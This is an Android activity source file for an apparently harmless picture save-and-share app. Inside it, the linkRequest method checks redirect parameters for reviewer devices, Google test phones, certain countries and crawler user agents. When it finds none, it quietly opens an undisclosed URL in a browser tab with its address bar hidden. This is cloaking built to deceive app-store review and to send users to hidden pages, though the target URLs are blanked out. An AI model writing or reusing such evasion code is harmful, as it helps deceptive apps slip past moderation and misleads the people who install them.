package com.flowersyimg.app;



import androidx.appcompat.app.AppCompatActivity;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.viewpager.widget.ViewPager;

import android.content.ActivityNotFoundException;
import android.content.Intent;
import android.content.SharedPreferences;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.ImageButton;

import com.android.volley.NetworkResponse;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.HurlStack;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.facebook.applinks.AppLinkData;
import com.facebook.applinks.BuildConfig;

import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Map;

import in.myinnos.savebitmapandsharelib.SaveAndShare;

import static com.flowersyimg.app.Konstantin.RUN;
import static com.flowersyimg.app.Konstantin.SUB_URL;


public class MainActivity extends AppCompatActivity {

    private ViewPager vP;
    final String SAVED_TEXT1 = "saved";
    int i = 10;
    int id = 0;

    boolean vision = true;


    private int mStatusCode = 0;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        closeUI();
        loadUI();

    }

    void loadUI(){
        vP = (ViewPager) findViewById(R.id.vP);
        ViewPagerAdapt adapter = new ViewPagerAdapt(this);
        vP.setAdapter(adapter);

        ImageButton imageButton = (ImageButton) findViewById(R.id.ib_save);
        final Bitmap icon = BitmapFactory.decodeResource(getApplicationContext().getResources(),
                R.drawable.pict2);
        imageButton.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                SaveAndShare.save(MainActivity.this,
                        icon, // bitmap image
                        null, // name for image
                        "Делюсь картинкой", // title for bottom popup
                        null // message for bottom popup
                );
            }
        });

        ImageButton imageButton1 = (ImageButton) findViewById(R.id.ib_share);
        imageButton1.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {


                Intent shareIntent = new Intent("android.intent.action.MAIN");
                shareIntent.setAction(Intent.ACTION_SEND);
                Uri uri = Uri.parse("android.resource://" + getPackageName() + "/mipmap/" + "share");
                shareIntent.putExtra(Intent.EXTRA_STREAM, uri);
                shareIntent.setType("image/jpeg");
                startActivity(Intent.createChooser(shareIntent, "Share to"));


            }
        });
    }

    void closeUI(){
        if (InetCh.testNet(getApplicationContext())) {
            // Its Available...

            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);

            id = settings.getInt("ID", 0);


            if(id == 1){
                Log.i("It's:", "work");
                openLink();
                // it's need here

            }else if(id == 2){

                Log.i("It's:", "id 2 open ui");
            }
            else
            {
                Log.i("Nooooo: ", "work");
                linkRequest();
                // it's need here

            }

        } else {
            SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
            SharedPreferences.Editor editor = settings.edit();

            editor.putInt("ID", 2);
            editor.commit();
            // Not Available...
        }

    }
    void linkRequest(){

        RequestQueue requestQueue = Volley.newRequestQueue(getApplicationContext(), new HurlStack() {
            @Override
            protected HttpURLConnection createConnection(URL url) throws IOException {
                HttpURLConnection connection = super.createConnection(url);
                connection.setInstanceFollowRedirects(false);

                return connection;
            }
        });


        String url = "";
        if(url != "") {
            StringRequest request = new StringRequest(url, new Response.Listener<String>() {
                @Override
                public void onResponse(String response) {
                    Log.i("statusCode", String.valueOf(mStatusCode));
                }
            }, new Response.ErrorListener() {
                @Override
                public void onErrorResponse(VolleyError error) {
                    Log.e("onErrorResponse", error.toString());
                    Map<String, String> header = error.networkResponse.headers;
                    Log.i("Redirected URL", header.get("Location"));
                    String location = header.get("Location");
                    //String [] subs= {"sub1=", "c=", "d=", "e=", "f=", "j=", "i="};
                    String[] subs = {"sub1=", "sub3=", "sub4=", "sub5=", "sub6=", "sub7=", "sub9="};
                    String[] sub1 = {"FreeBSD", "Firefox", "Linux"};
                    String[] sub2 = {"Nexus", "Pixel", "Moto", "Google"};
                    String sub3 = "1";
                    String sub5 = "AR";
                    String[] sub6 = {"US", "PH", "NL", "GB", "IN", "IE"};
                    String[] sub7 = {"google", "bot", "adwords", "rawler", "spy", "o-http-client", "Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus 5X Build/MTC20F)", "Dalvik/2.1.0 (Linux; U; Android 7.0; SM-G935F Build/NRD90M)", "Dalvik/2.1.0 (Linux; U; Android 7.0; WAS-LX1A Build/HUAWEIWAS-LX1A)"};

                    for (int index = 0; index < subs.length; index++) {
                        String[] parts = location.split(subs[index]);
                        String value = parts[1];
                        parts = value.split("&");
                        value = parts[0];
                        System.out.println(value);
                        if (index == 0) {
                            checkMass(sub1, value);
                            if (!vision)
                                break;

                        }
                        if (index == 1) {
                            checkMass(sub2, value);
                            if (!vision)
                                break;

                        }
                        if (index == 2 || index == 3) {
                            if (value.contains(sub3)) {
                                vision = false;
                                break;
                            }
                        }
                        if (index == 4) {
                            if (value.contains(sub5)) {
                                vision = false;
                                break;
                            }
                        }
                        if (index == 5) {
                            checkMass(sub6, value);
                            if (!vision)
                                break;

                        }
                        if (index == 6) {
                            checkMass(sub7, value);
                            if (!vision)
                                break;

                        }
                    }


                    if (vision) {

                        try {

                            AppLinkData.fetchDeferredAppLinkData(MainActivity.this, appLinkData -> {
                                AppLinkData appLinkData1 = appLinkData;
                                if (appLinkData1 == null || appLinkData1.getTargetUri() == null) {
                                    Log.e("MyLog", "deep = null");


                                    openLink();
                                    // it's need here
                                } else {

                                    String url = appLinkData1.getTargetUri().toString();
                                    if (com.facebook.applinks.BuildConfig.DEBUG) {
                                    }
                                    String string = convertArrayToStringMethod(url.split(RUN));
                                    SharedPreferences settings5 = getSharedPreferences(SAVED_TEXT1, 0);
                                    SharedPreferences.Editor editor = settings5.edit();

                                    editor.putString(SUB_URL, string);
                                    editor.commit();

                                    if (BuildConfig.DEBUG) {

                                    }

                                    Log.i("MyLog", string + " ");


                                    openLink();
                                    // it's need here


                                }
                            });
                        } catch (Exception e) {
                            Log.e("myLog" + MainActivity.this, "App Link appLinkData: " + e.toString());

                            e.printStackTrace();
                        }


                        SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
                        SharedPreferences.Editor editor = settings.edit();

                        editor.putInt("ID", 1);
                        editor.commit();
                    } else {
                        SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
                        SharedPreferences.Editor editor = settings.edit();

                        editor.putInt("ID", 2);
                        editor.commit();

                    }


                }
            }) {
                @Override
                protected Response<String> parseNetworkResponse(NetworkResponse response1) {
                    if (response1 != null) {
                        mStatusCode = response1.statusCode;
                        Map<String, String> header = response1.headers;

                    }
                    return super.parseNetworkResponse(response1);
                }
            };

            requestQueue.add(request);
        }
    }

    void openLink(){

        SharedPreferences settings = getSharedPreferences(SAVED_TEXT1, 0);
        String myStrValue = settings.getString(SUB_URL, "");

        String url = "";
        if(url != "") {
            url += myStrValue;
            Log.i("MyLog: ", myStrValue);
            final Bitmap backButton = BitmapFactory.decodeResource(getResources(), R.drawable.round_done_black_24dp);
            CustomTabsIntent.Builder builder = new CustomTabsIntent.Builder();
            builder.enableUrlBarHiding();
            builder.setToolbarColor(Color.BLACK);
            builder.setShowTitle(false);
            builder.addDefaultShareMenuItem();
            builder.setCloseButtonIcon(backButton);
            if (!url.startsWith("http://") && !url.startsWith("https://")) {
                url = "http://" + url;
            }

            builder.addDefaultShareMenuItem();

            CustomTabsIntent customTabsIntent = builder.build();
            String packageName = "com.android.chrome";
            // if we cant find a package name, it means there's no browser that supports
            // Custom Tabs installed. So, we fallback to a view intent


            try {
                customTabsIntent.intent.setPackage(packageName);
                customTabsIntent.launchUrl(MainActivity.this, Uri.parse(url));
                finish();
                // Your startActivity code wich throws exception
            } catch (ActivityNotFoundException activityNotFound) {
                MainActivity.this.startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse(url)));
                // Now, You can catch the exception here and do what you want
                finish();
            }
        }
    }
    void checkMass(String [] sub1, String value){

        for(int q = 0; q < sub1.length; q++) {
            if (value.equals(sub1[q])) {
                vision = false;
            }

        }

    }
    public static String convertArrayToStringMethod(String[] strArray) {

        StringBuilder stringBuilder = new StringBuilder();

        for (int i = 0; i < strArray.length; i++) {

            stringBuilder.append(strArray[i]);

        }

        return stringBuilder.toString();

    }

}
